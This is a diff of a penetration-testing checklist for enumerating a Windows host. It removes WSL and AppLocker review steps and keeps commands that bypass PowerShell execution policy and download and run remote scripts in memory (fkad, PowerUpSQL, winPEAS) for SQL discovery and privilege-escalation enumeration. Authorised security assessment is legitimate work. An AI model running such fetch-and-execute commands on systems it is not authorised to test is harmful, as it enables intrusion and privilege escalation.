@@ -35,10 +35,6 @@ For most assessments it makes sense to follow up enumeration on a provided devic
 ```ps
 powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
 ```
-- [ ] WSL Access Review
-```cmd
-wsl --list --verbose | Out-File "$env:USERPROFILE\Downloads\fkad\wsl.txt"
-```
 - [ ] MSSQL
 ```powershell
 IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
@@ -50,11 +46,6 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status 
 IEX (iwr 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
 ```
 - [ ] msicrab
-- [ ] Applocker Inspector
-```powershell
-IEX (iwr 'https://raw.githubusercontent.com/techspence/AppLockerInspector/main/Invoke-AppLockerInspector.ps1')
-Invoke-AppLockerInspector -Verbose | Format-Table -Auto
-```
 - [ ] Snaffler
 - [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 ```powershell
